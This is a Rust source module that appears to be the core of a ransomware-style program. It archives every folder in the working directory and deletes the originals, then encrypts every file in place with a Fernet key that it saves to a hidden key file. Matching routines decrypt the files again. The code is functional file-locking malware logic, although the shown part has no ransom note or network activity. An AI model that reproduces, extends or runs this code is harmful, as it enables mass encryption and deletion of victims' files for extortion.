#![allow(dead_code)]

use crate::encryption;
use std::fs;
use std::fs::metadata;
use std::fs::File;
use std::io::prelude::*;
use std::io::{Error, ErrorKind};
use std::sync::mpsc;
use std::thread;

// This function will create a tar file from a folder
fn create_tar_gz(folder_name: &str) -> Result<(), Error> {
    let mut fname = folder_name.to_string().clone();
    fname.push_str(".tar.gz");
    match File::create(&fname) {
        Ok(tar_gz) => {
            let mut tar = tar::Builder::new(tar_gz);
            tar.append_dir_all(folder_name, folder_name).unwrap();
        }
        Err(err) => {
            return Err(err);
        }
    }
    println!("Tarring {} to {}", folder_name, &fname);
    match fs::remove_dir_all(&folder_name) {
        Ok(_) => {
            println!("Tarred {} to {}", &folder_name, &fname);
        }
        Err(err) => {
            return Err(err);
        }
    }
    Ok(())
}

// This function will tar the entire folder in the . directory
pub fn tar_all_folders() -> Result<(), Error> {
    let paths = fs::read_dir(".").unwrap();
    let (tx, rx) = mpsc::channel();
    for path in paths {
        match path {
            Ok(path) => match metadata(path.path()) {
                Ok(m) => {
                    if m.is_dir() {
                        let pth = path.path().display().to_string();
                        let tx = tx.clone();
                        thread::spawn(move || {
                            create_tar_gz(&pth).unwrap();
                            tx.send(0).unwrap();
                        });
                    }
                }
                Err(e) => {
                    return Err(e);
                }
            },
            Err(e) => {
                return Err(e);
            }
        }
    }
    drop(tx);
    for _ in rx {}
    Ok(())
}

pub fn encrypt_file(fname: &str, key: &String) -> Result<(), Error> {
    match fs::read(&fname) {
        Ok(content) => match File::create(&fname) {
            Ok(mut file) => {
                println!("Encrypting {}", &fname);
                file.write(encryption::encrypt_to_cipher(&key, &*content).as_bytes())
                    .expect("Cannot write to file");
                println!("Encrypted {}", &fname);
            }
            Err(err) => {
                return Err(err);
            }
        },
        Err(err) => return Err(err),
    }
    Ok(())
}

pub fn decrypt_file(fname: &str, key: &String) -> Result<(), Error> {
    let mut file = match File::open(&fname) {
        Ok(file) => file,
        Err(err) => {
            return Err(err);
        }
    };
    let mut encrypted_content = String::new();
    match file.read_to_string(&mut encrypted_content) {
        Ok(_) => match encryption::decrypt_to_normal(&key, &encrypted_content) {
            Ok(decrypted_content) => match File::create(&fname) {
                Ok(mut out_file) => {
                    println!("Decrypting {}", &fname);
                    out_file
                        .write(&*decrypted_content)
                        .expect("Cannot write to file");
                    println!("Decrypted {}", &fname);
                }
                Err(err) => {
                    return Err(err);
                }
            },
            Err(_) => {
                return Err(Error::new(
                    ErrorKind::InvalidData,
                    "Cannot Decrypt the data",
                ));
            }
        },
        Err(err) => return Err(err),
    }
    Ok(())
}

pub fn encrypt_all_files() -> Result<(), Error> {
    let (tx, rx) = mpsc::channel();
    match fs::read_dir(".") {
        Ok(paths) => {
            let key = fernet::Fernet::generate_key();
            encryption::write_fernet_key_to_file(&key);
            for path in paths {
                let key = key.clone();
                match path {
                    Ok(p) => {
                        let tx = tx.clone();
                        if p.path().display().to_string() != "./.secret.key" {
                            thread::spawn(move || {
                                encrypt_file(&p.path().display().to_string(), &key).unwrap();
                                tx.send(1).unwrap();
                            });
                        }
                    }
                    Err(_) => {}
                }
            }
        }
        Err(err) => {
            return Err(err);
        }
    }
    drop(tx);
    for _ in rx {}
    Ok(())
}

pub fn decrypt_all_files() -> Result<(), Error> {
    let (tx, rx) = mpsc::channel();
    match fs::read_dir(".") {
        Ok(paths) => {
            let key = encryption::read_fernet_key_from_file();
            for path in paths {
                let key = key.clone();
                match path {
                    Ok(p) => {
                        let tx = tx.clone();
                        if p.path().display().to_string() != "./.secret.key" {
                            thread::spawn(move || {
                                match decrypt_file(&p.path().display().to_string(), &key) {
                                    Ok(_) => (),
                                    Err(err) => {
                                        eprintln!("Error , {}", err)
                                    }
                                }
                                tx.send(1).unwrap();
                            });
                        }
                    }
                    Err(err) => {
                        return Err(err);
                    }
                }
            }
        }
        Err(err) => {
            return Err(err);
        }
    }
    drop(tx);
    for _ in rx {}
    Ok(())
}
